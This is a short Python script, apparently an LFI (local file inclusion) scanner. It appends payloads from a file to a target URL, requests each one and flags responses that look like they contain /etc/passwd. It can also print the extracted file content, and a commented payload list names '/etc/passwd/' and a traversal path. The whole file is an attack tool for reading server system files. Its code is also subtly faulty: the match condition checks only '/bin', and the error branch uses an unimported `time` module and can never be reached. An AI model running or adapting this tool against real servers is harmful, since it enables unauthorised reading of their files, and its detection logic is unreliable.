from banner.banner import *
from bs4 import BeautifulSoup
from time import sleep
import requests
import argparse

parse = argparse.ArgumentParser()
parse.add_argument('-t','--target',help="Target",required=True)
parse.add_argument('-e','--extract',help="Extract content", action='store_true',required=False)
parse.add_argument('-p','--payload',help="Payloads file [Default = payloads.txt]",required=True)
parse = parse.parse_args()

# MANUAL
#payloads = ['/etc/passwd/','../etc/pwa']

payloads = open(parse.payload,'r')


if parse.target:
	banner()
	print("\nURL target ->> {}\n".format(parse.target))
	for p in payloads:
		p = p.replace("\n","")
		print("=" * 60)
		print("Payload: {}".format(parse.target+p))
		query = requests.get(parse.target+p)

		if 'root' and 'bash' and '/bin' in query.text:
			print("{}Probable LFI: {}{}".format(GREEN_NORMAL,parse.target+p,END))
			if parse.extract:
				e = BeautifulSoup(query.text,'html5lib')
				print(e.blockquote.text)
		print("=" * 60,"\n")
		
else:
	print(f"{RED_NORMAL}[ERR0R]{END} Argument invalid\nRequest help : python3 LFIscanner.py --help\nExit the script...")
	time.sleep(2)
	exit(0)	